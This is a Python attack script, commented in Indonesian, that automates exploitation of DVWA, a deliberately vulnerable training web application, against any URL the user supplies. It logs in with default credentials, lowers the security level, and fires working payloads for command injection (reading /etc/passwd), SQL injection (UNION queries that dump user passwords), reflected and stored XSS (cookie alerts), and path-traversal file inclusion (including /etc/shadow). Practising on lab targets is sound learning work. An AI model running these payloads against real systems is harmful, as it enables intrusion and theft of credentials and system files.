#!/usr/bin/env python3
"""
DVWA Security Tester
Penulis : resapaulusmiki@gmail.com
Versi   : 1.0
Deskripsi: Tool pengujian keamanan otomatis untuk DVWA (Damn Vulnerable Web Application).
           Hanya digunakan pada sistem milik sendiri atau dengan izin tertulis.
"""

import sys
import re
import warnings
import requests
from bs4 import BeautifulSoup
from datetime import datetime

warnings.filterwarnings("ignore")
try:
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

# ---------------------------------------------
#  Konfigurasi default
# ---------------------------------------------
DEFAULT_USER     = "admin"
DEFAULT_PASS     = "password"
DEFAULT_TIMEOUT  = 15

WARNA = {
    "hijau"  : "\033[92m",
    "merah"  : "\033[91m",
    "kuning" : "\033[93m",
    "biru"   : "\033[94m",
    "reset"  : "\033[0m",
    "tebal"  : "\033[1m",
}

def c(warna, teks):
    """Warnai teks di terminal."""
    return f"{WARNA.get(warna,'')}{teks}{WARNA['reset']}"


# ---------------------------------------------
#  Utilitas
# ---------------------------------------------
def banner_modul(judul):
    garis = "-" * 60
    print(f"\n{c('biru', garis)}")
    print(f"{c('tebal', f'  [*] {judul}')}")
    print(c('biru', garis))

def status(ok, pesan):
    tanda = c("hijau", "[+]") if ok else c("merah", "[-]")
    print(f"  {tanda} {pesan}")

def blok(pesan):
    print(c("kuning", f"  [!] {pesan}"))

def ambil_token(sess, url):
    """Ambil CSRF user_token dari halaman jika ada."""
    try:
        r = sess.get(url, verify=False, timeout=DEFAULT_TIMEOUT)
        m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([0-9a-f]+)", r.text)
        return r, (m.group(1) if m else None)
    except requests.exceptions.RequestException as e:
        class Gagal:
            text = ""
            status_code = "GAGAL"
            url = url
        return Gagal(), None

def kirim(sess, method, url, **kwargs):
    """Wrapper permintaan HTTP dengan penanganan error."""
    kwargs.setdefault("verify", False)
    kwargs.setdefault("timeout", DEFAULT_TIMEOUT)
    try:
        if method == "GET":
            return sess.get(url, **kwargs)
        return sess.post(url, **kwargs)
    except requests.exceptions.RequestException as e:
        class Gagal:
            status_code = type(e).__name__
            text = ""
            url = url
        return Gagal()

def kutip_hasil(html, batas=800):
    """Ambil teks dari area kode rentan atau body."""
    soup = BeautifulSoup(html, "html.parser")
    area = (
        soup.find("div", class_="vulnerable_code_area") or
        soup.find("pre") or
        soup.body or
        soup
    )
    teks = area.get_text("\n", strip=True) if area else ""
    return teks[:batas]


# ---------------------------------------------
#  Modul 1 – Login & Set Security
# ---------------------------------------------
def login(sess, base, user, passwd):
    banner_modul("LOGIN")
    r, tok = ambil_token(sess, f"{base}/login.php")
    data = {"username": user, "password": passwd, "Login": "Login"}
    if tok:
        data["user_token"] = tok
    r = kirim(sess, "POST", f"{base}/login.php", data=data, allow_redirects=True)
    sukses = "logout" in r.text.lower() or "login.php" not in r.url
    status(sukses, f"Login sebagai '{user}' → HTTP {r.status_code}")
    if not sukses:
        blok("Login gagal. Periksa kredensial atau URL target.")
        sys.exit(1)

def set_security_low(sess, base):
    r, tok = ambil_token(sess, f"{base}/security.php")
    d = {"security": "low", "seclev_submit": "Submit"}
    if tok:
        d["user_token"] = tok
    kirim(sess, "POST", f"{base}/security.php", data=d)
    status(True, "Security level di-set ke 'low'")


# ---------------------------------------------
#  Modul 2 – Command Injection
# ---------------------------------------------
def tes_command_injection(sess, base):
    banner_modul("COMMAND INJECTION  (/vulnerabilities/exec/)")
    url = f"{base}/vulnerabilities/exec/"
    payload_list = [
        "127.0.0.1;id",
        "127.0.0.1;uname -a",
        "127.0.0.1;cat /etc/passwd | head -5",
        "127.0.0.1;hostname",
        "127.0.0.1;ls /var/www/html",
    ]
    for payload in payload_list:
        r, tok = ambil_token(sess, url)
        data = {"ip": payload, "Submit": "Submit"}
        if tok:
            data["user_token"] = tok
        r = kirim(sess, "POST", url, data=data)
        diblok = r.status_code in ("400", 400)
        print(f"\n  {c('kuning','Payload:')} {payload}  (HTTP {r.status_code})")
        if diblok:
            blok("Diblok WAF/filter")
        else:
            hasil = kutip_hasil(r.text, 500)
            if hasil:
                print(c("hijau", "  +- Respons -----------------------"))
                for baris in hasil.split("\n"):
                    print(f"  | {baris}")
                print(c("hijau", "  +---------------------------------"))


# ---------------------------------------------
#  Modul 3 – SQL Injection
# ---------------------------------------------
def tes_sqli(sess, base):
    banner_modul("SQL INJECTION  (/vulnerabilities/sqli/)")
    url = f"{base}/vulnerabilities/sqli/"
    payload_list = [
        ("Error-based", "1'"),
        ("Boolean bypass", "1' OR '1'='1"),
        ("UNION dump users", "%' UNION SELECT user, password FROM users #"),
        ("UNION dump all", "' UNION SELECT table_name, column_name FROM information_schema.columns #"),
    ]
    for nama, payload in payload_list:
        r = kirim(sess, "GET", url, params={"id": payload, "Submit": "Submit"})
        diblok = r.status_code in ("400", 400)
        print(f"\n  {c('kuning', nama)}: {payload}  (HTTP {r.status_code})")
        if diblok:
            blok("Diblok WAF/filter")
        else:
            hasil = kutip_hasil(r.text, 700)
            if hasil:
                for baris in hasil.split("\n")[:15]:
                    print(f"    {baris}")


# ---------------------------------------------
#  Modul 4 – Cross-Site Scripting (XSS)
# ---------------------------------------------
def tes_xss(sess, base):
    banner_modul("CROSS-SITE SCRIPTING  (/vulnerabilities/xss_r/ & xss_s/)")

    # Reflected XSS
    print(f"\n  {c('kuning','Reflected XSS:')}")
    url_r = f"{base}/vulnerabilities/xss_r/"
    payload_r = [
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>",
        '"><svg onload=alert(1)>',
    ]
    for p in payload_r:
        r = kirim(sess, "GET", url_r, params={"name": p})
        terpantul = p in r.text if r.text else False
        print(f"    {'+ RENTAN' if terpantul else 'x Terfilter'}  payload={p[:50]}")

    # Stored XSS
    print(f"\n  {c('kuning','Stored XSS:')}")
    url_s = f"{base}/vulnerabilities/xss_s/"
    r_page, tok = ambil_token(sess, url_s)
    payload_s = "<script>alert('XSS_STORED')</script>"
    data = {
        "txtName": "tester",
        "mtxMessage": payload_s,
        "btnSign": "Sign Guestbook",
    }
    if tok:
        data["user_token"] = tok
    r = kirim(sess, "POST", url_s, data=data)
    tersimpan = payload_s in r.text if r.text else False
    status(tersimpan, f"Stored XSS {'BERHASIL disimpan' if tersimpan else 'diblok/di-encode'}")


# ---------------------------------------------
#  Modul 5 – File Inclusion (LFI/RFI)
# ---------------------------------------------
def tes_file_inclusion(sess, base):
    banner_modul("FILE INCLUSION  (/vulnerabilities/fi/)")
    url = f"{base}/vulnerabilities/fi/"
    paths = [
        "/etc/passwd",
        "/etc/issue",
        "/proc/version",
        "../../../../../../etc/passwd",
        "../../../../../../etc/shadow",
    ]
    for page in paths:
        r = kirim(sess, "GET", url, params={"page": page})
        bocor = any(k in r.text for k in ["root:", "Linux version", "Ubuntu", "Debian", "GNU"])
        kode = r.status_code
        lambang = c("hijau", "+ BOCOR") if bocor else "x Aman/Blok"
        print(f"  [{lambang}]  {page}  (HTTP {kode})")
        if bocor:
            hasil = kutip_hasil(r.text, 400)
            for baris in hasil.split("\n")[:8]:
                print(f"      {baris}")


# ---------------------------------------------
#  Entri Utama
# ---------------------------------------------
def main():
    print(c("tebal", "\n" + "="*60))
    print(c("tebal", "       DVWA Security Tester  v1.0"))
    print(c("tebal", f"       Waktu : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"))
    print(c("tebal", "="*60))
    print(c("kuning", "  [!] Gunakan hanya pada sistem milik sendiri / ber-izin!\n"))

    # -- Terima URL target --
    if len(sys.argv) >= 2:
        base = sys.argv[1].rstrip("/")
    else:
        base = input("  Masukkan URL target DVWA (contoh: http://127.0.0.1): ").strip().rstrip("/")

    # -- Terima kredensial --
    user_in  = input(f"  Username [{DEFAULT_USER}]: ").strip() or DEFAULT_USER
    pass_in  = input(f"  Password [{DEFAULT_PASS}]: ").strip() or DEFAULT_PASS

    # -- Pilih modul --
    print("""
  Menu Serangan:
    1. Command Injection
    2. SQL Injection
    3. Cross-Site Scripting (XSS)
    4. File Inclusion (LFI)
    5. Semua modul
    0. Keluar
""")
    pilih = input("  Pilihan [5]: ").strip() or "5"
    if pilih == "0":
        print("  Keluar.")
        sys.exit(0)

    # -- Mulai sesi --
    sess = requests.Session()
    sess.headers["User-Agent"] = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36"
    )

    login(sess, base, user_in, pass_in)
    set_security_low(sess, base)

    modul = {
        "1": tes_command_injection,
        "2": tes_sqli,
        "3": tes_xss,
        "4": tes_file_inclusion,
    }

    if pilih == "5":
        for fn in modul.values():
            fn(sess, base)
    elif pilih in modul:
        modul[pilih](sess, base)
    else:
        blok("Pilihan tidak valid.")

    print(f"\n{c('biru','-'*60)}")
    print(c("hijau", "  [+] Pengujian selesai."))
    print(c("biru", "-"*60 + "\n"))


if __name__ == "__main__":
    main()
